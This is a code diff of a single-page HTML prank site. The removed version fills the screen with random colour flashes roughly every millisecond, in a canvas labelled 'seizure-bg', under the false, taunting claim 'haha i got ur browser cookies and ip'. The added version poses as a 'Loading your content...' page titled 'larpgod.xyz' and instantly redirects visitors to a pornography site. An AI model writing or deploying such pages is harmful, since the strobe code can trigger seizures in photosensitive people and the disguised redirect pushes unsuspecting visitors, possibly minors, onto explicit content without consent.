@@ -3,75 +3,40 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>sorry</title>
+  <title>larpgod.xyz</title>
+  <link rel="icon" href="https://www.pornhub.com/favicon.ico" type="image/x-icon">
   <style>
     * { margin:0; padding:0; box-sizing:border-box; }
     html, body {
       height: 100%;
       overflow: hidden;
-    }
-    .container {
-      position: fixed;
-      top: 0; left: 0; right: 0; bottom: 0;
+      background: #000;
+      color: #fff;
+      font-family: Arial, sans-serif;
       display: flex;
       align-items: center;
       justify-content: center;
       text-align: center;
-      z-index: 10;
-      pointer-events: none;
     }
     h1 {
-      font-family: Arial, sans-serif;
-      font-size: 3rem;
-      color: #000;
-      letter-spacing: 3px;
-      font-weight: bold;
+      font-size: 2rem;
+      margin-bottom: 20px;
     }
-    @media (max-width: 768px) {
-      h1 { font-size: 1.8rem; }
-    }
-    .seizure-bg {
-      position: fixed;
-      top: 0; left: 0; width: 100%; height: 100%;
-      pointer-events: none;
+    .loading {
+      font-size: 1rem;
+      color: #ccc;
     }
   </style>
 </head>
 <body>
-
-  
-  <canvas class="seizure-bg" id="bg"></canvas>
-
-  
-  <div class="container">
-    <h1>haha i got ur browser cookies and ip</h1>
+  <div>
+    <h1>larpgod.xyz</h1>
+    <p class="loading">Loading your content...</p>
   </div>
 
   <script>
     
-    const colors = ['#ff0000', '#00ff00', '#0000ff', '#ffff00', '#00ffff', '#ff00ff', '#ffffff', '#000000'];
-    const canvas = document.getElementById('bg');
-    const ctx = canvas.getContext('2d');
-    canvas.width = window.innerWidth;
-    canvas.height = window.innerHeight;
-
-    
-    let last = 0;
-    function flash() {
-      const now = performance.now();
-      if (now - last > 1) { 
-        ctx.fillStyle = colors[Math.floor(Math.random() * colors.length)];
-        ctx.fillRect(0, 0, canvas.width, canvas.height);
-        last = now;
-      }
-      requestAnimationFrame(flash);
-    }
-    flash();
-
-    window.addEventListener('resize', () => {
-      canvas.width = window.innerWidth;
-      canvas.height = window.innerHeight;
-    });
+    window.location.href = 'https://www.pornhub.com';
   </script>
 </body>
 </html>
